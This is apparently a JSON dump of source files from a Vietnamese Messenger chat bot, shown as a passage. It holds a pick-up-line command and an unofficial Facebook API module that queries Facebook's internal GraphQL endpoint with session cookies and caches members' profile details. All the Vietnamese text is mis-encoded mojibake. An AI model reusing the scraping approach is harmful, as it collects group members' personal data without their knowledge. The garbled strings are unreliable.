ùóØùóºÃ£ÃÇ ùòÅùóµùóÆÃÄùóªùóµ ùòÉùó∂ùó≤ÃÇùóª ùòÅùóøùóºùóªùó¥ ùóªùóµùóºÃÅùó∫ ( ùü≠ ùóªùóµùóºÃÅùó∫ )\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùó∫ùó≤ùó∫ùóØùó≤ùóø ùòÅùóÆùó¥ => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùó±ùòÇÃõùóºÃõÃ£ùó∞ ùòÅùóÆùó¥`, threadID, messageID);\n      break;\n  }\n}","path":null,"size_bytes":8334,"size_tokens":null},"modules/commands/thinh.js":{"content":"module.exports.config = {\n    name: \"thinh\",\n    version: \"0.0.1\",\n    hasPermssion: 0,\n    credits: \"JRT\",\n    description: \"Th√≠nh\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    cooldowns: 5\n};\n\nmodule.exports.run = function ({ api, event }) {\n    const data = [\"G·ªçi ch·ªã l√† ƒë·ªì ƒÉn\\nV√¨ kh√¥ng c√≥ ch·ªã th√¨ em s·∫Ω g·∫ßy\",\n\n      \"G·ªçi ch·ªã l√† th·ªùi trang yodi\\nB·ªüi v√¨ ch·ªã lookgood feelgood\",\n\n      \"Em v√≠ d·ª• m√¨nh nh∆∞ s·ªë 4-6\\nƒê·ªÉ ƒë∆∞·ª£c ·ªü c√πng quanh 5\",\n\n      \"G·ªçi ch·ªã l√† C√¥ Gi√°o\\nB·ªüi v√¨ c·ª© g·∫∑p ch·ªã l√† em mu·ªën Tr·∫£ B√†i\",\n\n      \"G·ªçi ch·ªã l√† c√°i gh·∫ø\\nV√¨ em y√™u ch·ªã kh·ªèi ph·∫£i B√†n\",\n\n      \"G·ªçi em l√† th·∫©m ph√°n\\nV√¨ th·∫•y em l√† anh mu·ªën chung th√¢n\",\n\n      \"M·ªôt n·ª• c∆∞·ªùi b·∫±ng 10 thang thu·ªëc b·ªï\\nV√¨ v·∫≠y anh mu·ªën c·∫£ ng√†y smile (s·ªù mai)\",\n\n      \"Anh c·ª±c gh√©t ng√†y m√πng 1-6\\nB·ªüi v√¨ ng√†y ƒë√≥ l√† ng√†y Thi·∫øu Nhi\",\n\n      \"Em l√† m·ªôt ho·∫° sƒ© t·ªìi\\nV√¨ em v·∫Ω c·∫ßu v·ªìng th√¨ thi·∫øu n·∫Øng, v·∫Ω h·∫°nh ph√∫c th√¨ thi·∫øu anh\",\n\n      \"Mu·ªën m·ªôt l·∫ßn ƒë∆∞a Roma sang Lu√¢n ƒê√¥n\\nƒê·ªÉ em th·∫•y ƒë∆∞·ª£c th√†nh √Ω trong anh\",\n\n      \"Pascal th√¨ vi·∫øt ph∆∞∆°ng tr√¨nh\\nC√≤n anh th√¨ vi·∫øt chuy·ªán t√¨nh hai ta\",\n\n      \"Cu, CuCl2 v√† Fe3o4 th√¨ c√≥ th·ªÉ k·∫øt t·ªßa\\nC√≤n anh v√† em th√¨ c√≥ th·ªÉ k·∫øt h√¥n\",\n\n      \"Nh√¨n em anh l·∫°i nh·ªõ ƒë·∫øn Ng√¥ T·∫•t T·ªë\\nB·ªüi v√¨ anh ch·ªâ mu·ªën t·∫Øt ƒë√®n\",\n\n      \"Tr√°i tim anh ƒëang dao ƒë·ªông ƒëi·ªÅu ho√†\\nT·ª´ khi em ƒë·∫øn b·ªóng l·ªách pha\",\n\n      \"Nh√¨n em anh th·∫•y y√™u ƒë·ªông v·∫≠t\\nV√¨ ch·ªâ c√≥ em l√†m anh th√≠ch th√∫\",\n\n      \"Anh ch·ªâ mu·ªën ch√∫ng m√¨nh l√† heo\\nƒê·ªÉ ƒë∆∞·ª£c c√πng em ƒÉn v√† ng·ªß\",\n\n      \"Anh bi·∫øt em th√≠ch badboy\\nAnh ƒë√¢y trai t·ªët n√†o ƒë√¢u c√≥ ph·∫ßn\\nV√¨ t√≠nh anh kh√¥ng vui nh∆∞ng m√† t√∫i anh kh√¥ng v∆°i\",\n\n       \"G·ªçi em l√† N·ªôi 1972\\nV√¨ khi·∫øn anh ng√†y ƒë√™m kh√¥ng ng·ªß\",\n\n      \"G·∫∑p em anh ch·ªâ mu·ªën nh√¨n sang tr√°i\\nƒê·ªÉ th·∫•y y√™u em l√† ph·∫£i\",\n\n      \"G·ªçi em l√† ƒë√®n ƒë·ªè\\nV√¨ th·∫•y em l√† anh bi·∫øt ƒëi·ªÉm d·ª´ng\",\n\n      \"N·∫Øng kia ƒë√¢u l√†m anh ch√°y\\nNh∆∞ng em c∆∞·ªùi ch·∫Øc ch·∫Øn l√†m anh say\",\n\n      \"G·ªçi em l√† ng√£ r·∫Ω\\nV√¨ g·∫∑p em l√† anh ph·∫£i cua\",\n\n      \"Tr√¥ng c·∫≠u h√†i qu√°\\nToi cuoi cau duoc khong?\",\n\n      \"G·ªçi em l√† C√°ch M·∫°ng Th√°ng 8\\n V√¨ em l√† Th·ªùi c∆° ng√†n nƒÉm c√≥ m·ªôt\",\n\n      \"Em c√≥ th·ªÉ nh·ªù anh t·∫•t c·∫£\\nK·ªÉ c·∫£ nh·ªù ∆° nh∆° s·∫Øc nh·ªõ\",\n\n      \"V√¨ em ng·ªçt ng√†o\\nN√™n tim anh m·ªõi l·ªçt v√†o\",\n\n      \"Ng·∫Øm ho√†ng h√¥n anh qu√™n c·∫£ tr·ªùi t·ªëi\\nNg·∫Øm em c∆∞·ªùi anh qu√™n c·∫£ thanh xu√¢n\",\n\n      \"Xu√¢n Di·ªáu th√¨ bi·∫øt l√†m th∆°\\nC√≤n anh ch·ªâ bi·∫øt ng·∫©n ng∆° nh√¨n n√†ng\",\n\n      \"N·∫øu em coi t√¨nh y√™u l√† gi·ªçt n∆∞·ªõc bi·ªÉn\\nAnh s·∫Ω ƒë·ªï c·∫£ ƒë·∫°i d∆∞∆°ng v√†o tim em\",\n\n      \"G·∫∑p em anh b·ªóng n·∫∑ng ƒë·∫ßu\\nTr√™n ƒë·∫ßu l√† t√≥c, trong ƒë·∫ßu l√† em\",\n\n      \"G·ªçi em l√† sunlight\\nV√¨ th·∫•y em l√† anh mu·ªën ch√©n s·∫°ch\",\n\n      \"Em l√† kh√≥i, anh l√† th·ªãt heo\\nT·∫°i v√¨ th·ªãt heo s·∫Ω ƒë∆∞·ª£c hun kh√≥i\",\n\n      \"Anh mu·ªën l√†m c·∫£nh s√°t giao th√¥ng\\nƒê·ªÉ d·∫Øt em v√†o le duong\",\n\n      \"T√≠nh c·∫£ r·ªìi\\nNh∆∞ng g·∫∑p em l·∫°i r·ªëi c·∫£ t√¨nh\",\n\n      \"G·ªçi anh l√† Florentino c√≤n em l√† hoa\\nV√¨ anh kh√¥ng th·ªÉ ƒë·ªÉ h·ª•t m·∫•t em\",\n\n      \"B·∫ßu tr·ªùi nhi√™u m√¢y l·∫°i thi·∫øu n·∫Øng\\nL√≤ng ta tr·ªëng v·∫Øng v√¨ thi·∫øu em\",\n\n      \"T·∫∑ng em 1 qu·∫£ chanh th·∫ßn\\nC·∫Øt ra l√† s·ª± ch√¢n th√†nh\",\n\n      \"G·ªçi em l√† Canada 1867\\nV√¨ em ƒë√£ t·ª´ng thu·ªôc v·ªÅ Anh\",\n\n      \"Th·ªùi ti·∫øt n√†y y√™u anh l√† h·ª£p l√Ω\\nEm m√† b·ªè ph√≠ th√¨ l√† em ngu\",\n\n      \"M√πa ƒë√¥ng gi√≥ l·∫°nh t·ª´ng c∆°n\\nY√™u anh th√¨ s·∫Ω th√≠ch h∆°n m·ªôt m√¨nh\",\n\n      \"ƒê√†i b√°o h√¥m nay tr·ªùi tr·ªü gi√≥\\nEm ƒëi ƒë√¢u ƒë√≥ nh·ªõ mang theo anh\",\n\n      \"Em ∆°i n·∫Øng ·∫•m xa d·∫ßn\\nƒê√¥ng sang gi√≥ l·∫°nh anh c·∫ßn em th√¥i\",\n\n      \"M·ªói ng√†y anh tr·∫£ cho em m·ªôt chi·∫øc th∆°m\\nƒê√≥ g·ªçi l√† thu·∫ø m√°\",\n\n      \"Y√™u em nh∆∞ x trong ph∆∞∆°ng tr√¨nh\\nBi·∫øt r·∫±ng v√¥ nghi·ªám v·∫´n y√™u em\",\n\n      \"Nguy·ªÖn Du l√∫c vi·∫øt Truy·ªán Ki·ªÅu\\nH√¨nh nh∆∞ vi·∫øt thi·∫øu l√† Ki·ªÅu thua em\",\n\n      \"Anh h·ªçc r·∫•t d·ªët vƒÉn\\nB·ªüi v√¨ y√™u em t·ªõi kh√≥ t·∫£\",\n\n      \"Covid th√¨ anh kh√¥ng d√≠nh\\nNh∆∞ng y√™u em th√¨ anh d∆∞∆°ng t√≠nh\",\n\n      \"G·ªçi em l√† nam ch√¢m\\nAnh l√† t·ª´ tr∆∞·ªùng v√¨ l√∫c n√†o anh c≈©ng t·ªìn t·∫°i quanh em\",\n\n      \"Nghe n√≥i em c√≥ n·ª• c∆∞·ªùi to·∫£ n·∫Øng\\nVay em thu cuoi anh xem\",\n\n      \"G·ªçi em l√† Hong Kong 1841\\nV√¨ khi ƒë√≥ em thu·ªôc v·ªÅ Anh\",\n\n      \"G·ªçi em l√† c√† ph√™\\nV√¨ c√†ng c√† c√†ng ph√™\",\n\n      \"Em c√≥ th·ªÉ c∆∞·ªùi m·ªôt ch√∫t kh√¥ng\\nV√¨ c√† ph√™ anh qu√™n b·ªè ƒë∆∞·ªùng r·ªìi\",\n\n      \"Thi·∫øu oxi ta kh√¥ng th·ªÉ th·ªü\\nV·∫ª ƒë·∫πp c·ªßa n√†ng th∆° kh√¥ng th·ªÉ t·∫£\",\n\n      \"T√°ch ly d√πng ƒë·ªÉ u·ªëng tr√†\\nT√¨nh ca ƒë·ªÉ h√°t, em l√† ƒë·ªÉ y√™u.\",\n\n      \"Anh cho ph√©p em ·ªü m√£i trong tr√°i tim anh ƒë·∫•y.\",\n\n        \"C√°i g√¨ ƒë·∫ßy trong m·∫Øt em ƒë√≥? H√¨nh nh∆∞ l√† anh.\",\n\n        \"S·ªë tr·ªùi ƒë√£ ƒë·ªãnh, kh√¥ng ph·∫£i l√≤ng em, ch·∫Øc ch·∫Øn anh s·∫Ω ·∫ø.\",\n\n        \"Nh√† em c√≥ b√°n r∆∞·ª£u kh√¥ng m√† sao n√≥i chuy·ªán v·ªõi em l√†m anh c·ª© ch·∫ønh cho√°ng? Ch√†ng trai n√†y th·∫≠t b√° ƒë·∫°o. M·ªôt c√°ch th·∫£ th√≠nh g√¢y ·∫•n t∆∞·ª£ng m·∫°nh ƒë·∫•y.\",\n\n        \"C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ h·∫°nh ph√∫c. Nhanh nh·∫•t ch√≠nh l√† nh√¨n th·∫•y em.\",\n\n        \"H√£y ƒë·ªÉ m·ªôt l·∫ßn cho anh ƒë∆∞·ª£c y√™u em.\",\n\n        \"H√¥m nay 14 th√°ng 3, m√† sao ch∆∞a ai t·∫∑ng qu√† anh nh·ªâ?.\",\n\n        \"Trong tim em c√≥ ch·ªó n√†o cho anh kh√¥ng?.\",\n\n        \"V·∫≠n t·ªëc tr√°i tim nhanh kh√¥ng em nh·ªâ? ƒê·ªÉ anh t√≠nh qu√£ng ƒë∆∞·ªùng ƒëi ƒë·∫øn tr√°i tim em..\",\n\n        \"M√¢y l√† c·ªßa tr·ªùi, em l√† c·ªßa anh (tag t√™n ch√≠nh ch·ªß v√†o) Kh·∫≥ng ƒë·ªãnh ch·ªß quy·ªÅn r·ªìi nh√©. N·∫øu ƒë∆∞·ª£c tag t√™n m√¨nh v√†o th√¨ t·ª´ nay c·∫•m ƒëi th·∫£ th√≠nh lung tung nh√°.\",\n\n        \"Ngo√†i kia ƒë√°m c∆∞·ªõi linh ƒë√¨nh. Bao gi·ªù th√¨ ƒë·∫øn l∆∞·ª£t m√¨nh em ∆°i.\",\n\n        \"Tay anh ƒë√¢y ·∫•m l·∫Øm, em mu·ªën n·∫Øm th·ª≠ kh√¥ng?.\",\n\n        \"1, 2, 3, 5 em c√≥ ƒë√°nh r∆°i nh·ªãp n√†o kh√¥ng?.\",\n\n        \"Em xinh ƒë·∫πp ∆°i, l√†m con d√¢u m·∫π anh kh√¥ng?.\",\n\n        \"C·∫ßn l·∫Øm m·ªôt em g√°i m∆∞a!.\",\n\n        \"Gi√° c√≥ em ng∆∞·ªùi y√™u ƒë·ªÉ c√πng kh√°m ph√° th·∫ø gi·ªõi.\",\n\n        \"M√¨nh c≈©ng ƒë·∫πp trai, sao ch·∫£ ai ƒë·ªÉ √Ω?.\",\n\n        \"ƒê√¥ng v·ªÅ tay anh l·∫°nh l·∫Øm, nh∆∞ng anh v·∫´n s·∫µn l√≤ng s∆∞·ªüi ·∫•m tay em.\",\n\n        \"M·ªçi ng∆∞·ªùi ƒë·ªÅu y√™u c√°i ƒë·∫πp, n√™n anh y√™u em.\",\n\n        \"B√£o to, c√¢y ƒë·ªï. Sao em ch∆∞a ƒë·ªï anh?.\",\n\n        \"B·ªë em c√≥ ph·∫£i l√† m·ªôt th·ª£ kim ho√†n kh√¥ng? Sao em gi·ªëng vi√™n kim c∆∞∆°ng v·∫≠y?.\",\n\n        \"V·ªõi th·∫ø gi·ªõi th√¨ em ch·ªâ l√† m·ªôt ng∆∞·ªùi. C√≤n v·ªõi anh, em l√† c·∫£ th·∫ø gi·ªõi.\",\n\n        \"B·ªë em c√≥ ph·∫£i l√† t√™n tr·ªôm kh√¥ng? Sao c√≥ th·ªÉ tr·ªôm v√¨ sao v√† g·∫Øn v√†o m·∫Øt em nh∆∞ th·∫ø?.\",\n\n        \"Anh nh∆∞ th·∫ø n√†y, ƒë√£ ƒë·ªß ti√™u chu·∫©n l√†m b·∫°n trai em ch∆∞a?.\",\n\n        \"Em c√≥ mu·ªën l√†m M·∫∑t Tr·ªùi duy nh·∫•t c·ªßa anh kh√¥ng?\",\n\n        \"N√†y em ∆°i, m·∫π anh ƒëang g·ªçi con d√¢u k√¨a.\",\n\n        \"Gi·ªù n·∫øu c√≥ c√¥ g√°i n√†o nguy·ªán b√™n anh, anh s·∫Ω khi·∫øn c√¥ ·∫•y h·∫°nh ph√∫c m√£i v·ªÅ sau.\",\n\n        \"Ch·ªâ c·∫ßn em y√™u anh th√¥i, c√≤n c·∫£ th·∫ø gi·ªõi c·ª© ƒë·ªÉ anh lo.\",\n\n        \"Cu·ªôc ƒë·ªùi n√†y ch·∫Øc ch·∫Øn kh√¥ng nh∆∞ √Ω anh mu·ªën, v·∫≠y em s·∫Ω nh∆∞ √Ω anh mu·ªën.\",\n\n        \"Em c√≥ th·ªÉ ƒë∆∞a anh ƒë·∫øn ti·ªám b√°nh ƒë∆∞·ª£c kh√¥ng? V√¨ anh c≈©ng mu·ªën c√≥ m·ªôt chi·∫øc b√°nh Cutie gi·ªëng nh∆∞ em v·∫≠y.\",\n\n        \"Cho anh h·ªèi em m·ªôt ch√∫t ƒë∆∞·ª£c kh√¥ng?‚Ä¶. Anh tr√¥ng em r·∫•t l√† quen‚Ä¶.Anh nghƒ© l√†? M√¨nh c√≥ bi·∫øt nhau kh√¥ng?(Ch√©m v·ªõi g√°i l·∫° th√¨ ch·∫Øc ch·∫Øn s·∫Ω b·∫£o kh√¥ng r·ªìi)‚Ä¶.Th·∫ø √†. Tr√¥ng em r·∫•t gi·ªëng ng∆∞·ªùi y√™u t∆∞∆°ng lai c·ªßa anh. ?.\",\n\n        \"Anh l√†‚Ä¶. C√≤n em t√™n g√¨? (Em t√™n Qu·ª≥nh Anh) Qu·ª≥nh Anh C√°i t√™n l√† l√† ƒë·∫πp nh∆∞ng m√† v·ªÅ sau anh s·∫Ω kh√¥ng ƒë·∫∑t t√™n con g√°i m√¨nh l√† Qu·ª≥nh Anh v√¨ su·ªët ng√†y ph·∫£i l√™n b·∫£ng.\",\n\n        \"Anh mu·ªën h·ªèi em m·ªôt c√¢u n√†y,‚Ä¶th·ª±c ra ƒë·∫•y kh√¥ng ph·∫£i l√† m·ªôt c√¢u h·ªèi. Anh ch·ªâ mu·ªën n√≥i l√†‚Ä¶ N·∫øu nh∆∞ m√† em l√† CocaCola th√¨ anh s·∫Ω l√† Pepsi! (Nghƒ©a l√† ch√∫ng ta l√† m·ªôt c·∫∑p ƒë·ªì u·ªëng ƒë·∫πp ƒë√¥i).\",\n\n        \"Ch√°n th·∫£ th√≠nh r·ªìi, ai c∆∞a ƒëi ƒë·ªÉ anh ƒë·ªï th·ª≠ m·ªôt l·∫ßn.\",\n\n        \"Anh c√° v·ªõi em r·∫±ng em l√† tay tr·ªôm chuy√™n nghi·ªáp. B·ªüi v√¨ anh m·ªõi nh√¨n th·∫•y em ·ªü ƒë√¢y v√† trong nh√°y m·∫Øt l√† em ƒë√£ ƒë√°nh c·∫Øp tr√°i tim c·ªßa anh r·ªìi.\",\n    \n        \"Ng√†y ƒë√≥ tr·ªùi m∆∞a l·ªõn l·∫Øm, anh g·∫∑p ƒë∆∞·ª£c em, em kh√¥ng th·∫•y anh, anh kh√¥ng th·∫•y m∆∞a.\",\n\n        \"ƒê·ªë em m·ªôt con g·∫•u b·∫Øc c·ª±c n·∫∑ng bao nhi√™u kg? (Th∆∞·ªùng th√¨ c√°c c√¥ g√°i s·∫Ω tr·∫£ l·ªùi kh√¥ng) ƒê√°p: Anh c≈©ng kh√¥ng bi·∫øt nh∆∞ng anh bi·∫øt con g·∫•u b·∫Øc c·ª±c ƒë·ªß n·∫∑ng ƒë·ªÉ ph√° v·ª° t·∫£ng bƒÉng gi·ªØa ch√∫ng ta.\",\n\n        \"N·∫øu m·ªói l·∫ßn nh·ªõ t·ªõi em anh ƒë∆∞·ª£c 500 ƒë·ªìng ch·∫Øc gi·ªù n√†y anh ƒë√£ v∆∞·ª£t xa Bill Gates.\",\n\n        \"Em c√≥ bi·∫øt r·∫±ng anh nh·ªõ em nhi·ªÅu l·∫Øm kh√¥ng? Anh ƒÉn kh√¥ng ngon nh∆∞ng ng·ªß nh∆∞ ƒëi√™n, anh ƒëi gi·∫ßy qu√™n ƒëi t·∫•t, ƒÉn s√°ng qu√™n ƒë√°nh rƒÉng, anh d√πng xƒÉng vo g·∫°o, anh kh·ªù kh·∫°o c≈©ng ch·ªâ v√¨ y√™u em ƒë√≥.\",\n\n        \"Em ∆°i! Em l√† ngh·ªÅ g√¨ ƒë·∫•y‚Ä¶.? Sao ƒë√™m n√†o em c≈©ng hi·ªán l√™n trong gi·∫•c m∆° c·ªßa anh v·∫≠y? Anh ch·∫≥ng bi·∫øt l√†m th·∫ø n√†o n·ªØa c·∫£. L√†m ng∆∞·ªùi y√™u anh em nh√©!.\",\n\n        \"Em ∆°i ! Khi em ƒë·ªçc tin nh·∫Øn n√†y, em n·ª£ anh cu·ªôc h·∫πn. X√≥a tin nh·∫Øn n√†y, em n·ª£ anh cu·ªôc t√¨nh. L∆∞u tin l√† em n·ª£ anh 1 n·ª• h√¥n. Tr·∫£ l·ªùi anh, em n·ª£ anh t·∫•t c·∫£. C√≤n n·∫øu em kh√¥ng tr·∫£ l·ªùi th√¨ em ƒë√£ y√™u anh !!! hihi.\",\n\n        \"√êi·ªÅu duy nh·∫•t ƒë√¥i m·∫Øt em ch∆∞a n√≥i cho anh bi·∫øt l√† t√™n c·ªßa em.\",\n                  \n        \"Anh th√† ƒë∆∞·ª£c m·ªôt l·∫ßn ng·ª≠i ƒë∆∞·ª£c m√πi t√≥c th∆°m c·ªßa em. Anh th√† ƒë∆∞·ª£c m·ªô l·∫ßn xi·∫øt ch·∫∑t b√†n tay c·ªßa em, anh th√† ƒë∆∞·ª£c m·ªôt l·∫ßn n·∫øm h∆∞∆°ng v·ªã ng·ªçt t·ª´ n·ª• h√¥n c·ªßa em c√≤n h∆°n l√† s·ªëng b·∫•t t·ª≠ m√† kh√¥ng ƒë∆∞·ª£c ƒëi·ªÅu ·∫•y.\",\n                  \n        \"Ch∆∞ÃÅng nghi√™Ã£n th∆∞ÃÅc ƒë√™m cuÃÄng n√¥ÃÉi nh∆°ÃÅ em, anh ƒë√£ c·ªë nh∆∞ng s∆∞Ãâa kh√¥ng ƒë∆∞∆°Ã£c.\",\n                  \n        \"Anh mu·ªën g·ª≠i tin nh·∫Øn n√†y ƒë·∫øn em h√¥m nay v√¨ h√¥m nay anh c·∫£m th·∫•y y√™u em nhi·ªÅu ƒë·∫øn b·∫•t th∆∞·ªùng.\",\n\n  ];\n  return api.sendMessage(`${data[Math.floor(Math.random() * data.length)]}`, event.threadID, event.messageID);\n}","path":null,"size_bytes":10704,"size_tokens":null},"lib/fca-auto/src/getThreadInfo.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nconst MAX_ARRAY_LENGTH = 6; //safe \nvar Request_Update_Time = 0;\nvar updateInterval;\nvar updateTimeout;\nlet Queues = [];\n\nlet onetimecook = false\n\nfunction addToQueues(num) {\n  const existingArray = Queues.some(subArr => subArr.some(obj => obj.threadID == num.threadID));\n\n  if (!existingArray) {\n    if (Queues.length > 0 && Queues[Queues.length - 1].length === MAX_ARRAY_LENGTH) {\n      Queues.push([num]);\n    } else {\n      const lastArray = Queues.length > 0 ? Queues[Queues.length - 1] : [];\n      lastArray.push(num);\n\n      if (Queues.length === 0) {\n        Queues.push(lastArray);\n      }\n    }\n  }\n}\n\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  var { createData,getData,hasData,updateData, getAll } = require('../Extra/ExtraGetThread');\n  var Database = require('../Extra/Database');\n  \n  return async function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n    \n    if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n\n    if (utils.getType(global.Fca.Data.Userinfo) == \"Array\" || global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = new Map();\n\n    const updateUserInfo = (threadInfo) => {\n      if (!global.Fca.Data.Userinfo) {\n        global.Fca.Data.Userinfo = new Map();\n      }\n    \n      threadInfo.forEach(thread => {\n        const userInfo = thread.userInfo;\n    \n        if (Array.isArray(userInfo)) {\n          const userInfoMap = new Map(userInfo.map(user => [user.id, user]));\n          for (const [id, user] of userInfoMap) {\n            global.Fca.Data.Userinfo.set(id, user);\n          }\n        }\n      });\n    };\n  \n  const getMultiInfo = async function (threadIDs) {\n      let form = {};\n      let tempThreadInf = [];\n          threadIDs.forEach((x,y) => {\n              form[\"o\" + y] = {\n                  doc_id: \"3449967031715030\",\n                  query_params: { id: x, message_limit: 0, load_messages: false, load_read_receipts: false, before: null }\n              }; \n          });\n      let Submit = { queries: JSON.stringify(form), batch_name: \"MessengerGraphQLThreadFetcher\" };\n          \n      const promise = new Promise((resolve, reject) => {\n          defaultFuncs.post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, Submit)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(resData => {\n              if (resData.error || resData[resData.length - 1].error_results !== 0) throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n                  resData = resData.slice(0, -1).sort((a, b) => Object.keys(a)[0].localeCompare(Object.keys(b)[0]));\n                  resData.forEach((x, y) => tempThreadInf.push(formatThreadGraphQLResponse(x[\"o\" + y].data)));\n                  return resolve({\n                      Success: true,\n                      Data: tempThreadInf\n                  });\n          })\n          .catch(() => { \n              reject({ Success: false, Data: '' }) \n          });\n      })\n  \n      return await promise;\n  }\n  \n  const formatAndUpdateData = (AllThreadInfo) => {\n      try {\n          AllThreadInfo.forEach(threadInf => { updateData(threadInf.threadID, threadInf); })\n          updateUserInfo(AllThreadInfo) // [ {}, {} ]\n  \n      } catch (e) {\n          console.log(e);\n      }\n  }\n\n  const formatAndCreateData = (AllThreadInfo) => {\n    try {\n        AllThreadInfo.forEach(threadInf => { createData(threadInf.threadID, threadInf); })\n        updateUserInfo(AllThreadInfo) // [ {}, {} ]\n\n    } catch (e) {\n        console.log(e);\n    }\n}\n  \n  const checkAverageStaticTimestamp = function (avgTimeStamp) {\n    const DEFAULT_UPDATE_TIME = 900 * 1000; //th·ªùi gian c·∫≠p nh·∫≠t t·ªëi ƒëa + v·ªõi th·ªùi gian trung b√¨nh c·ªßa t·ªïng request 1 m·∫£ng\n    //khi request ph√∫t th·ª© 3, 1 req ·ªü ph√∫t th·ª© 7, 1 req ·ªü ph√∫t th·ª© 10, v·∫≠y trung b√¨nh l√† (3+7+1) / time.length (3) + v·ªõi 15p = tg trung b√¨nh ƒë·ªÉ c·∫≠p nh·∫≠t 1 